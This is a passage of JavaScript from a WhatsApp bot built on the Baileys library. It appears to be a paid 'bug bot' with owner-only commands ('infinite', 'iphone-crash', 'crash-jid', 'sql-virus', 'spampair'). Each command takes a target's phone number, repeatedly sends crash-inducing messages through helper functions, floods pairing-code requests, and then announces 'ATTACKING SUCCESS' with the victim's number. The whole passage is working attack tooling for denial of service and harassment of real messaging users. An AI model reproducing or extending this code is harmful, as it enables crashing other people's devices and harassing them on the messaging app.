						for (let i = 0; i < 6; i++) {
					await CrashUi(VxoZap, X, null, GetsuZo, cct = true, ptcp = true)
				}
				for (let i = 0; i < 1; i++) {
				await ClPm(VxoZap, X, GetsuZo, cct = true, ptcp = true)				
				}
				let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								contextInfo: {
									mentionedJid: [m.sender],
									isForwarded: true,
									forwardingScore: 999,
									forwardedNewsletterMessageInfo: {
										newsletterJid: global.xchannel.jid,
										newsletterName: ' ᤪᤣ᪰𝐕͢𝐑ᤠ𝐋ᤡ 𝐕͢ᤡ𝟗',
										serverMessageId: -1
									},
									businessMessageForwardInfo: {
										businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
									},
								},
								body: proto.Message.InteractiveMessage.Body.create({
									text: ''
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: " ᤪᤣ᪰𝐕͢𝐑ᤠ𝐋ᤡ 𝐕͢ᤡ𝟗"
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝙋𝘼𝙔 𝙓 𝙎𝙌𝙇`,
									subtitle: "",
									hasMediaAttachment: true,
									...(await prepareWAMessageMedia({
										image: {
											url: "https://telegra.ph/file/d75f8a14bf5fd2590c2d3.jpg"
										}
									}, {
										upload: VxoZap.waUploadToServer
									}))
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [{
																		"name": "quick_reply",
										"buttonParamsJson": `{\"display_text\":\"𝙐𝙉𝙇𝙄𝙈𝙄𝙏𝙀𝘿 𝘾𝙍𝘼𝙎𝙃\",\"id\":\"infinite ${incTarget}\"}`
									}, ],
								})
							})
						}
					}
				}, {})

				await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
					messageId: msg.key.id
				});
						await taskdone(finishmoji)
			}
		}
		break
				case 'infinite': {
if (!isCreator) return replyy(`𝘽𝙀𝙇𝙄 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝘿𝙐𝙇𝙐 𝘽𝘼𝙉𝙂 𝙈𝙊𝙃𝙊𝙉 𝙃𝙐𝘽𝙐𝙉𝙂𝙄 𝙊𝙒𝙉𝙀𝙍`)
			if (!q) return replyy(`*Syntax Error!*\n\n_Use : ${prefix+command} Number_\n_Example : ${prefix+command} 62xx_\n\n${global.namaowner}`);
			let {
				proto,
				generateWAMessageFromContent
			} = require('@whiskeysockets/baileys')
			incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
			if (incTarget.startsWith('0')) return replyy(`*Syntax Error!*\n\n_Use : ${prefix+command} Number_\n_Example : ${prefix+command} 62xx_\n\n${global.namaowner}`)
			let X = incTarget + '@s.whatsapp.net';
			if (owner.includes(incTarget)) {
				replyy('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
			} else {
				replyy(`*𝙋𝙍𝙊𝘾𝙀𝙎𝙎 𝙋𝙀𝙍𝙈𝘼𝙉𝙀𝙉 𝘾𝙍𝘼𝙎𝙃⚡*`)
				global.jumlah = text.split("|")[1]
				for (let i = 0; i < 20; i++) {	
				await ZnXIvS(VxoZap, X, Ptcp = true)
			 await CrashUi(VxoZap, X, null, GetsuZo, cct = true, ptcp = true)						
				}
			let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								contextInfo: {
									mentionedJid: [m.sender],
									isForwarded: true,
									forwardingScore: 999,
									forwardedNewsletterMessageInfo: {
										newsletterJid: global.xchannel.jid,
										newsletterName: ' ᤪᤣ᪰𝐕͢𝐑ᤠ𝐋ᤡ 𝐕͢ᤡ𝟗',
										serverMessageId: -1
									},
									businessMessageForwardInfo: {
										businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
									},
								},
								body: proto.Message.InteractiveMessage.Body.create({
									text: ''
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: " ᤪᤣ᪰𝐕͢𝐑ᤠ𝐋ᤡ 𝐕͢ᤡ𝟗"
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝐁𝐔𝐓𝐓𝐎𝐍 𝐕𝐈𝐑𝐔𝐒`,
									subtitle: "",
									hasMediaAttachment: true,
									...(await prepareWAMessageMedia({
										image: {
											url: "https://telegra.ph/file/d75f8a14bf5fd2590c2d3.jpg"
										}
									}, {
										upload: VxoZap.waUploadToServer
									}))
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [{
										"name": "quick_reply",
										"buttonParamsJson": "{\"display_text\":\" ᤪᤣ᪰𝐕͢𝐑ᤠ𝐋ᤡ 𝐕͢ᤡ𝟗 𝐍𝐈𝐇 𝐁𝐎𝐒𝐙𝐙\",\"id\":\"\"}"
									}, ],
								})
							})
						}
					}
				}, {})

				await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
					messageId: msg.key.id
				});
						await taskdone(finishmoji)
			}
		}
		break
		case 'invisble-infinite': {
if (!isCreator) return replyy(`𝘽𝙀𝙇𝙄 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝘿𝙐𝙇𝙐 𝘽𝘼𝙉𝙂 𝙈𝙊𝙃𝙊𝙉 𝙃𝙐𝘽𝙐𝙉𝙂𝙄 𝙊𝙒𝙉𝙀𝙍`)
			if (!q) return replyy(`*Syntax Error!*\n\n_Use : ${prefix+command} Number_\n_Example : ${prefix+command} 62xx_\n\n${global.namaowner}`);
			let {
				proto,
				generateWAMessageFromContent
			} = require('@whiskeysockets/baileys')
			incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
			if (incTarget.startsWith('0')) return replyy(`*Syntax Error!*\n\n_Use : ${prefix+command} Number_\n_Example : ${prefix+command} 62xx_\n\n${global.namaowner}`)
			let X = incTarget + '@s.whatsapp.net';
			if (owner.includes(incTarget)) {
				replyy('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
			} else {
				replyy(`*𝙋𝙍𝙊𝘾𝙀𝙎𝙎 𝙋𝙀𝙍𝙈𝘼𝙉𝙀𝙉 𝘾𝙍𝘼𝙎𝙃⚡*`)
				global.jumlah = text.split("|")[1]
			for (let i = 0; i < 120; i++) {
					await InVisiXz(VxoZap, X, GetsuZo, cct = true, ptcp = true)
					await sleep(5000)
				}
			let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								contextInfo: {
									mentionedJid: [m.sender],
									isForwarded: true,
									forwardingScore: 999,
									forwardedNewsletterMessageInfo: {
										newsletterJid: global.xchannel.jid,
										newsletterName: ' ᤪᤣ᪰𝐕͢𝐑ᤠ𝐋ᤡ 𝐕͢ᤡ𝟗',
										serverMessageId: -1
									},
									businessMessageForwardInfo: {
										businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
									},
								},
								body: proto.Message.InteractiveMessage.Body.create({
									text: ''
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: " ᤪᤣ᪰𝐕͢𝐑ᤠ𝐋ᤡ 𝐕͢ᤡ𝟗"
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝙂𝙀𝙉𝙄𝙐𝙎 𝘽𝙐𝙂`,
									subtitle: "",
									hasMediaAttachment: true,
									...(await prepareWAMessageMedia({
										image: {
											url: "https://telegra.ph/file/d75f8a14bf5fd2590c2d3.jpg"
										}
									}, {
										upload: VxoZap.waUploadToServer
									}))
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [{
										"name": "quick_reply",
										"buttonParamsJson": "{\"display_text\":\" ᤪᤣ᪰𝐕͢𝐑ᤠ𝐋ᤡ 𝐕͢ᤡ𝟗 𝐍𝐈𝐇 𝐁𝐎𝐒𝐙𝐙\",\"id\":\"\"}"
									}, ],
								})
							})
						}
					}
				}, {})

				await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
					messageId: msg.key.id
				});
						await taskdone(finishmoji)
			}
		}
		break
			case 'suxoinfinite': {
if (!isCreator) return replyy(`𝘽𝙀𝙇𝙄 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝘿𝙐𝙇𝙐 𝘽𝘼𝙉𝙂 𝙈𝙊𝙃𝙊𝙉 𝙃𝙐𝘽𝙐𝙉𝙂𝙄 𝙊𝙒𝙉𝙀𝙍`)
			if (!q) return replyy(`*Syntax Error!*\n\n_Use : ${prefix+command} Number_\n_Example : ${prefix+command} 62xx_\n\n${global.namaowner}`);
			let {
				proto,
				generateWAMessageFromContent
			} = require('@whiskeysockets/baileys')
			incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
			if (incTarget.startsWith('0')) return replyy(`*Syntax Error!*\n\n_Use : ${prefix+command} Number_\n_Example : ${prefix+command} 62xx_\n\n${global.namaowner}`)
			let X = incTarget + '@s.whatsapp.net';
			if (owner.includes(incTarget)) {
				replyy('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
			} else {
				replyy(`*𝙋𝙍𝙊𝘾𝙀𝙎𝙎 𝙋𝙀𝙍𝙈𝘼𝙉𝙀𝙉 𝘾𝙍𝘼𝙎𝙃⚡*`)
				global.jumlah = text.split("|")[1]
				for (let i = 0; i < 25; i++) {									
			await ZnX(VxoZap, X, "P", 1020000, Ptcp = true)
                    await ClPmNull(VxoZap, X, null, GetsuZo, cct = true, ptcp = true)
                    await ClPmNull(VxoZap, X, null, GetsuZo, cct = true, ptcp = true)
                    await ZnX(VxoZap, X, nick.sss, 350000, Ptcp = true)
                    await ZnX(VxoZap, X, nick.sss, 800000, Ptcp = true)
                    await ZnX(VxoZap, X, nick.sss, 800000, Ptcp = true)
				}
			let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								contextInfo: {
									mentionedJid: [m.sender],
									isForwarded: true,
									forwardingScore: 999,
									forwardedNewsletterMessageInfo: {
										newsletterJid: global.xchannel.jid,
										newsletterName: ' ᤪᤣ᪰𝐕͢𝐑ᤠ𝐋ᤡ 𝐕͢ᤡ𝟗',
										serverMessageId: -1
									},
									businessMessageForwardInfo: {
										businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
									},
								},
								body: proto.Message.InteractiveMessage.Body.create({
									text: ''
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: " ᤪᤣ᪰𝐕͢𝐑ᤠ𝐋ᤡ 𝐕͢ᤡ𝟗"
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝐏𝐀𝐘𝐌𝐄𝐍𝐓 𝐈𝐍𝐕𝐈𝐓𝐄`,
									subtitle: "",
									hasMediaAttachment: true,
									...(await prepareWAMessageMedia({
										image: {
											url: "https://telegra.ph/file/d75f8a14bf5fd2590c2d3.jpg"
										}
									}, {
										upload: VxoZap.waUploadToServer
									}))
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [{
										"name": "quick_reply",
										"buttonParamsJson": "{\"display_text\":\" ᤪᤣ᪰𝐕͢𝐑ᤠ𝐋ᤡ 𝐕͢ᤡ𝟗 𝐍𝐈𝐇 𝐁𝐎𝐒𝐙𝐙\",\"id\":\"\"}"
									}, ],
								})
							})
						}
					}
				}, {})

				await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
					messageId: msg.key.id
				});
						await taskdone(finishmoji)
			}
		}
		break
	case 'vrl-attack' :case 'one-hit': {
if (!isCreator) return replyy(`𝘽𝙀𝙇𝙄 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝘿𝙐𝙇𝙐 𝘽𝘼𝙉𝙂 𝙈𝙊𝙃𝙊𝙉 𝙃𝙐𝘽𝙐𝙉𝙂𝙄 𝙊𝙒𝙉𝙀𝙍`)
			if (!q) return replyy(`*Syntax Error!*\n\n_Use : ${prefix+command} Number_\n_Example : ${prefix+command} 62xx_\n\n${global.namaowner}`);
			let {
				proto,
				generateWAMessageFromContent
			} = require('@whiskeysockets/baileys')
			incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
			if (incTarget.startsWith('0')) return replyy(`*Syntax Error!*\n\n_Use : ${prefix+command} Number_\n_Example : ${prefix+command} 62xx_\n\n${global.namaowner}`)
			let X = incTarget + '@s.whatsapp.net';
			if (owner.includes(incTarget)) {
				replyy('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
			} else {
				replyy(`𝐁𝐎𝐓 𝐈𝐒 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐋𝐄𝐀𝐒𝐄 𝐖𝐀𝐈𝐓 ☣︎`)
				global.jumlah = text.split("|")[1]
				for (let i = 0; i < 1; i++) {
					await ZnX(VxoZap, X, "P", 1020000, Ptcp = true)
                    await ClPmNull(VxoZap, X, null, GetsuZo, cct = true, ptcp = true)
                    await ClPmNull(VxoZap, X, null, GetsuZo, cct = true, ptcp = true)
                    await ZnX(VxoZap, X, nick.sss, 350000, Ptcp = true)
                    await ZnX(VxoZap, X, nick.sss, 800000, Ptcp = true)
                    await ZnX(VxoZap, X, nick.sss, 800000, Ptcp = true)
				}
				let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								contextInfo: {
									mentionedJid: [m.sender],
									isForwarded: true,
									forwardingScore: 999,
									forwardedNewsletterMessageInfo: {
										newsletterJid: global.xchannel.jid,
										newsletterName: ' ᤪᤣ᪰𝐕͢𝐑ᤠ𝐋ᤡ 𝐕͢ᤡ𝟗',
										serverMessageId: -1
									},
									businessMessageForwardInfo: {
										businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
									},
								},
								body: proto.Message.InteractiveMessage.Body.create({
									text: ''
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: " ᤪᤣ᪰𝐕͢𝐑ᤠ𝐋ᤡ 𝐕͢ᤡ𝟗"
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝐁𝐔𝐓𝐓𝐎𝐍 𝐈𝐍𝐓𝐄𝐑𝐀𝐂𝐓𝐈𝐕𝐄`,
									subtitle: "",
									hasMediaAttachment: true,
									...(await prepareWAMessageMedia({
										image: {
											url: "https://telegra.ph/file/d75f8a14bf5fd2590c2d3.jpg"
										}
									}, {
										upload: VxoZap.waUploadToServer
									}))
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [{
												"name": "quick_reply",
										"buttonParamsJson": `{\"display_text\":\"𝙐𝙉𝙇𝙄𝙈𝙄𝙏𝙀𝘿 𝘾𝙍𝘼𝙎𝙃\",\"id\":\"suxoinfinite ${incTarget}\"}`
									}, ],
								})
							})
						}
					}
				}, {})

				await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
					messageId: msg.key.id
				});
						await taskdone(finishmoji)
			}
		}
		break
		case 'fuckyou': case 'sql-virus': {
if (!isCreator) return replyy(`𝘽𝙀𝙇𝙄 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝘿𝙐𝙇𝙐 𝘽𝘼𝙉𝙂 𝙈𝙊𝙃𝙊𝙉 𝙃𝙐𝘽𝙐𝙉𝙂𝙄 𝙊𝙒𝙉𝙀𝙍`)
			if (!q) return replyy(`*Syntax Error!*\n\n_Use : ${prefix+command} Number_\n_Example : ${prefix+command} 62xx_\n\n${global.namaowner}`);
			let {
				proto,
				generateWAMessageFromContent
			} = require('@whiskeysockets/baileys')
			incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
			if (incTarget.startsWith('0')) return replyy(`*Syntax Error!*\n\n_Use : ${prefix+command} Number_\n_Example : ${prefix+command} 62xx_\n\n${global.namaowner}`)
			let X = incTarget + '@s.whatsapp.net';
			if (owner.includes(incTarget)) {
				replyy('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
			} else {
				replyy(`𝐁𝐎𝐓 𝐈𝐒 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐋𝐄𝐀𝐒𝐄 𝐖𝐀𝐈𝐓 ☣︎`)
				global.jumlah = text.split("|")[1]
				for (let i = 0; i < 1; i++) {
				await CaroUsel(VxoZap, X)
				}
				let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								contextInfo: {
									mentionedJid: [m.sender],
									isForwarded: true,
									forwardingScore: 999,
									forwardedNewsletterMessageInfo: {
										newsletterJid: global.xchannel.jid,
										newsletterName: ' ᤪᤣ᪰𝐕͢𝐑ᤠ𝐋ᤡ 𝐕͢ᤡ𝟗',
										serverMessageId: -1
									},
									businessMessageForwardInfo: {
										businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
									},
								},
								body: proto.Message.InteractiveMessage.Body.create({
									text: ''
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: " ᤪᤣ᪰𝐕͢𝐑ᤠ𝐋ᤡ 𝐕͢ᤡ𝟗"
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝐁𝐔𝐓𝐓𝐎𝐍 𝐈𝐍𝐓𝐄𝐑𝐀𝐂𝐓𝐈𝐕𝐄`,
									subtitle: "",
									hasMediaAttachment: true,
									...(await prepareWAMessageMedia({
										image: {
											url: "https://telegra.ph/file/d75f8a14bf5fd2590c2d3.jpg"
										}
									}, {
										upload: VxoZap.waUploadToServer
									}))
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [{
												"name": "quick_reply",
										"buttonParamsJson": `{\"display_text\":\"𝙐𝙉𝙇𝙄𝙈𝙄𝙏𝙀𝘿 𝘾𝙍𝘼𝙎𝙃\",\"id\":\"infinite ${incTarget}\"}`
									}, ],
								})
							})
						}
					}
				}, {})

				await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
					messageId: msg.key.id
				});
						await taskdone(finishmoji)
			}
		}
		break
		case 'bugringan': case 'crash-jid': {
if (!isCreator) return replyy(`𝘽𝙀𝙇𝙄 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝘿𝙐𝙇𝙐 𝘽𝘼𝙉𝙂 𝙈𝙊𝙃𝙊𝙉 𝙃𝙐𝘽𝙐𝙉𝙂𝙄 𝙊𝙒𝙉𝙀𝙍`)
			if (!q) return replyy(`*Syntax Error!*\n\n_Use : ${prefix+command} Number_\n_Example : ${prefix+command} 62xx_\n\n${global.namaowner}`);
			let {
				proto,
				generateWAMessageFromContent
			} = require('@whiskeysockets/baileys')
			incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
			if (incTarget.startsWith('0')) return replyy(`*Syntax Error!*\n\n_Use : ${prefix+command} Number_\n_Example : ${prefix+command} 62xx_\n\n${global.namaowner}`)
			let X = incTarget + '@s.whatsapp.net';
			if (owner.includes(incTarget)) {
				replyy('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
			} else {
				replyy(`𝐁𝐎𝐓 𝐈𝐒 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐋𝐄𝐀𝐒𝐄 𝐖𝐀𝐈𝐓 ☣︎`)
				global.jumlah = text.split("|")[1]
				for (let i = 0; i < 1; i++) {
					await OutOff(VxoZap, X, Ptcp = true)
				}
				let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								contextInfo: {
									mentionedJid: [m.sender],
									isForwarded: true,
									forwardingScore: 999,
									forwardedNewsletterMessageInfo: {
										newsletterJid: global.xchannel.jid,
										newsletterName: ' ᤪᤣ᪰𝐕͢𝐑ᤠ𝐋ᤡ 𝐕͢ᤡ𝟗',
										serverMessageId: -1
									},
									businessMessageForwardInfo: {
										businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
									},
								},
								body: proto.Message.InteractiveMessage.Body.create({
									text: ''
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: " ᤪᤣ᪰𝐕͢𝐑ᤠ𝐋ᤡ 𝐕͢ᤡ𝟗"
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝐒𝐐𝐋 𝐗 𝐎𝐓𝐂`,
									subtitle: "",
									hasMediaAttachment: true,
									...(await prepareWAMessageMedia({
										image: {
											url: "https://telegra.ph/file/d75f8a14bf5fd2590c2d3.jpg"
										}
									}, {
										upload: VxoZap.waUploadToServer
									}))
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [{
												"name": "quick_reply",
										"buttonParamsJson": `{\"display_text\":\"𝙐𝙉𝙇𝙄𝙈𝙄𝙏𝙀𝘿 𝘾𝙍𝘼𝙎𝙃\",\"id\":\"infinite ${incTarget}\"}`
									}, ],
								})
							})
						}
					}
				}, {})

				await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
					messageId: msg.key.id
				});
						await taskdone(finishmoji)
			}
		}
		break
				case 'iphone-crash': {
if (!isCreator) return replyy(`𝘽𝙀𝙇𝙄 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝘿𝙐𝙇𝙐 𝘽𝘼𝙉𝙂 𝙈𝙊𝙃𝙊𝙉 𝙃𝙐𝘽𝙐𝙉𝙂𝙄 𝙊𝙒𝙉𝙀𝙍`)
			if (!q) return replyy(`*Syntax Error!*\n\n_Use : ${prefix+command} Number_\n_Example : ${prefix+command} 62xx_\n\n${global.namaowner}`);
			let {
				proto,
				generateWAMessageFromContent
			} = require('@whiskeysockets/baileys')
			incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
			if (incTarget.startsWith('0')) return replyy(`*Syntax Error!*\n\n_Use : ${prefix+command} Number_\n_Example : ${prefix+command} 62xx_\n\n${global.namaowner}`)
			let X = incTarget + '@s.whatsapp.net';
			if (owner.includes(incTarget)) {
				replyy('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
			} else {
				replyy(`𝐁𝐎𝐓 𝐈𝐒 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐋𝐄𝐀𝐒𝐄 𝐖𝐀𝐈𝐓 ☣︎`)
				global.jumlah = text.split("|")[1]
				for (let i = 0; i < 200; i++) {
							await XiosPay(VxoZap, X)
					await XiosVirus(VxoZap, X)
					await sleep(1500)
				}
				let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								contextInfo: {
									mentionedJid: [m.sender],
									isForwarded: true,
									forwardingScore: 999,
									forwardedNewsletterMessageInfo: {
										newsletterJid: global.xchannel.jid,
										newsletterName: ' ᤪᤣ᪰𝐕͢𝐑ᤠ𝐋ᤡ 𝐕͢ᤡ𝟗',
										serverMessageId: -1
									},
									businessMessageForwardInfo: {
										businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
									},
								},
								body: proto.Message.InteractiveMessage.Body.create({
									text: ''
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: " ᤪᤣ᪰𝐕͢𝐑ᤠ𝐋ᤡ 𝐕͢ᤡ𝟗"
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝐂𝐫𝐚𝐬𝐡𝐈𝐨𝐬`,
									subtitle: "",
									hasMediaAttachment: true,
									...(await prepareWAMessageMedia({
										image: {
											url: "https://telegra.ph/file/d75f8a14bf5fd2590c2d3.jpg"
										}
									}, {
										upload: VxoZap.waUploadToServer
									}))
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [{
												"name": "quick_reply",
										"buttonParamsJson": `{\"display_text\":\"𝙐𝙉𝙇𝙄𝙈𝙄𝙏𝙀𝘿 𝘾𝙍𝘼𝙎𝙃\",\"id\":\"iphone-crash ${incTarget}\"}`
									}, ],
								})
							})
						}
					}
				}, {})

				await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
					messageId: msg.key.id
				});
						await taskdone(finishmoji)
			}
		}
		break
		
		case 'spampair': {
			if (!isCreator) return replyy(`𝐎𝐖𝐍𝐄𝐑 𝐎𝐍𝐋𝐘`)
			if (!q) return replyy(`*Syntax Error!*\n\n_Use : Spampair NUMBER|AMOUNT_\n_Example : Spampair 62xx\n\n${global.namaowner}`)
			let [peenis, pepekk = "200"] = q.split("|")
			await replyy(`𝐒𝐔𝐊𝐒𝐄𝐒 𝐉𝐀𝐍𝐆𝐀𝐍 𝐋𝐔𝐏𝐀 𝐉𝐄𝐃𝐀`)
			await taskdone(finishmoji)
			let target = peenis.replace(/[^0-9]/g, '').trim()
			let {
				default: makeWaSocket,
				useMultiFileAuthState,
				fetchLatestBaileysVersion
			} = require('@whiskeysockets/baileys')
			let {
				state
			} = await useMultiFileAuthState('session')
			let {
				version
			} = await fetchLatestBaileysVersion()
			let sucked = await makeWaSocket({
				auth: state,
				version,
				logger: pino({
					level: 'fatal'
				})
			})
			for (let i = 0; i < pepekk; i++) {
				await sleep(1500)
				let prc = await sucked.requestPairingCode(target)
				await console.log(`# Succes Spam Pairing Code - Number : ${target} - Code : ${prc}`)
			}
			await sleep(15000)
		}
		break
			case 'hardbug': {
if (!isCreator) return replyy(`𝘽𝙀𝙇𝙄 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝘿𝙐𝙇𝙐 𝘽𝘼𝙉𝙂 𝙈𝙊𝙃𝙊𝙉 𝙃𝙐𝘽𝙐𝙉𝙂𝙄 𝙊𝙒𝙉𝙀𝙍`)
			if (!q) return replyy(`*Syntax Error!*\n\n_Use : ${prefix+command} Number_\n_Example : ${prefix+command} 62xx_\n\n${global.namaowner}`);
			incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
			if (incTarget.startsWith('0')) return replyy(`*Syntax Error!*\n\n_Use : ${prefix+command} Number_\n_Example : ${prefix+command} 62xx_\n\n${global.namaowner}`)
